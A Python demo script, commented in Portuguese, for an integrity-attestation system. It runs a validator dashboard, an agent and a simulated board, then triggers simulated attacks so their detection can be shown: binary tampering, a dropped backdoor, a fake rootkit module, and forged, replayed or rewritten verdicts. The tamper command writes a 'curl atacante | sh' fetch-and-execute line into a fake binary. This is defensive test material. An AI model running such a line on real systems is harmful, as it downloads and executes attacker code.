"""Demonstração completa SEM a placa (plano B da apresentação e ensaio).

Sobe o validador com painel, uma "placa" simulada (root e /proc falsos),
o agente com ciclo curto e o workload. Abra http://localhost:8700 e digite
comandos no terminal:

  tamper  -> adultera binário (L2 ALTERED)
  drop    -> instala binário não autorizado (L2 UNAUTHORIZED)
  delete  -> remove binário da baseline (L2 MISSING)
  module  -> carrega "rootkit" (L3 MODULE_NEW)
  miner   -> carga atípica sem violar regras (IA -> SUSPECT)
  taint   -> kernel marcado como tainted (alerta, não revoga)
  silence -> para o agente (dead man's switch)
  replay  -> reenvia o último veredito capturado (recusado, não revoga)
  forge   -> envia veredito com conteúdo alterado (assinatura inválida, não revoga)
  chain   -> apaga o elo da cadeia prev_hash (revoga no próximo ciclo)
  reset   -> restaura a placa e re-provisiona com chave nova
  quit

  python3 scripts/sim_demo.py [--interval 5] [--port 8700]
  py scripts\\sim_demo.py --interval 5                       (Windows)
"""
import argparse
import copy
import shutil
import sys
import tempfile
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tests"))
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "workload"))

try:
    import cryptography  # noqa: E402,F401
except ImportError:
    sys.exit(f"Falta a dependência cryptography. Instale com:\n  \"{sys.executable}\" -m pip install cryptography")

from atebeagle import baseline as bmod, config, crypto  # noqa: E402
from atebeagle.agent import Agent  # noqa: E402
from atebeagle.common import retry_if_locked, write_json  # noqa: E402
from atebeagle.validator import Validator, serve  # noqa: E402
from fakeboard import make_fake_board  # noqa: E402
import sensor  # noqa: E402


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--interval", type=float, default=5)
    ap.add_argument("--port", type=int, default=8700)
    a = ap.parse_args()

    tmp = Path(tempfile.mkdtemp(prefix="atebeagle-sim-"))
    root, proc = make_fake_board(tmp)
    keys = tmp / "keys"
    pub = crypto.generate_keypair(str(keys / "device.key"), str(keys / "device.pub"))
    crypto.generate_keypair(str(keys / "authority.key"), str(keys / "authority.pub"))
    bl = bmod.sign(bmod.build(str(root), ["/usr/bin", "/opt/atebeagle"]),
                   crypto.load_private(str(keys / "authority.key")))
    write_json(str(tmp / "baseline.json"), bl)
    pristine = tmp / "pristine"
    shutil.copytree(root, pristine)
    shutil.copytree(proc, tmp / "proc_pristine")

    vcfg = config._merge(config.VALIDATOR_DEFAULTS, {
        "port": a.port, "state_file": None,
        "devices": {"bbb-01": {"pubkey": pub, "baseline": str(tmp / "baseline.json")}},
        "anomaly": {"enabled": True, "warmup": 8, "threshold": 6.0},
    })
    v = Validator(vcfg)
    try:
        srv = serve(v, "127.0.0.1", a.port)
    except OSError as e:
        shutil.rmtree(tmp, ignore_errors=True)
        sys.exit(f"Não foi possível abrir a porta {a.port}: {e}\n"
                 "Provavelmente outra demo ainda está aberta. Feche-a ou use outra porta com --port.")
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{a.port}"

    acfg = config._merge(config.AGENT_DEFAULTS, {
        "interval_s": a.interval, "state_dir": str(tmp / "state"), "device_key": str(keys / "device.key"),
        "baseline_pubkey": str(keys / "authority.pub"), "validator_url": url,
        "l2": {"collector": "fs", "root": str(root), "fs_paths": ["/usr/bin", "/opt/atebeagle"],
               "baseline": str(tmp / "baseline.json")},
        "l3": {"proc_root": str(proc), "kint_path": str(tmp / "no_kint")},
        "gate": {"token_file": str(tmp / "run/workload.token"), "led": None, "on_fail_cmd": None},
    })
    state = {"agent": Agent(acfg), "agent_on": True}
    # O reset apaga e recria a placa simulada: não pode ocorrer no meio de um ciclo,
    # senão o agente mede uma árvore pela metade (e, no Windows, trava o rmtree).
    board_lock = threading.Lock()

    def agent_loop():
        while True:
            with board_lock:
                if state["agent_on"]:
                    try:
                        state["last_env"] = state["agent"].cycle()["envelope"]
                    except Exception as e:
                        print("[agente] erro:", e)
            time.sleep(a.interval)

    def sensor_loop():
        while True:
            r = sensor.send(url, acfg["gate"]["token_file"], "bbb-01")
            if not r.get("accepted"):
                print(f"[workload] BLOQUEADO: {r.get('reason')}")
            time.sleep(a.interval / 2)

    threading.Thread(target=agent_loop, daemon=True).start()
    threading.Thread(target=sensor_loop, daemon=True).start()
    print(f"\nPainel: {url}\nComandos: tamper | drop | delete | module | miner | taint | silence | "
          "replay | forge | chain | reset | quit\n")

    while True:
        try:
            cmd = input("> ").strip()
        except EOFError:
            # sem terminal interativo: mantém rodando para o painel
            while True:
                time.sleep(3600)
        except KeyboardInterrupt:
            cmd = "quit"
        try:
            if cmd == "tamper":
                (root / "opt/atebeagle/workload").write_bytes(b"#!/bin/sh\ncurl atacante | sh\n")
            elif cmd == "drop":
                p = root / "usr/bin/backdoor"
                p.write_bytes(b"\x7fELF backdoor")
                p.chmod(0o755)
            elif cmd == "taint":
                (proc / "sys/kernel/tainted").write_text("4096\n")
            elif cmd == "delete":
                (root / "opt/atebeagle/workload").unlink(missing_ok=True)
            elif cmd in ("replay", "forge"):
                env = state.get("last_env")
                if not env:
                    print("ainda não há veredito capturado")
                    continue
                env = copy.deepcopy(env)
                if cmd == "forge":  # atacante altera o conteúdo sem ter a chave do dispositivo
                    env["body"]["epoch"] += 1
                    env["body"]["ts"] = time.time()
                    env["body"]["findings"] = []
                print(f"[{cmd}] validador:", state["agent"].pub.send(env).get("reason"))
            elif cmd == "chain":
                with board_lock:  # atacante tenta esconder vereditos reescrevendo o elo anterior
                    write_json(str(tmp / "state" / "chain.json"), {"last": "f" * 64})
            elif cmd == "module":
                with open(proc / "modules", "a") as f:
                    f.write("diamorphine 16384 0 - Live 0x0\n")
            elif cmd == "miner":
                (proc / "loadavg").write_text("3.95 3.1 1.2 5/240 999\n")
            elif cmd == "silence":
                state["agent_on"] = False
                print(f"agente parado; revogação em ~{a.interval * 2.5:.0f}s")
            elif cmd == "reset":
                with board_lock:
                    retry_if_locked(shutil.rmtree, root)
                    shutil.copytree(pristine, root)
                    retry_if_locked(shutil.rmtree, proc)
                    shutil.copytree(tmp / "proc_pristine", proc)
                    shutil.rmtree(tmp / "state", ignore_errors=True)
                    newpub = crypto.generate_keypair(str(keys / "device.key"), str(keys / "device.pub"))
                    v.reset("bbb-01", newpub)
                    state["agent"] = Agent(acfg)
                    state["agent_on"] = True
                    state["last_env"] = None
            elif cmd in ("quit", "exit", "q"):
                srv.shutdown()
                shutil.rmtree(tmp, ignore_errors=True)
                return
            elif cmd:
                print("comando desconhecido")
        except OSError as e:  # um arquivo travado não pode derrubar a demonstração
            print(f"[demo] comando {cmd} falhou: {e}. Tente de novo.")


if __name__ == "__main__":
    main()
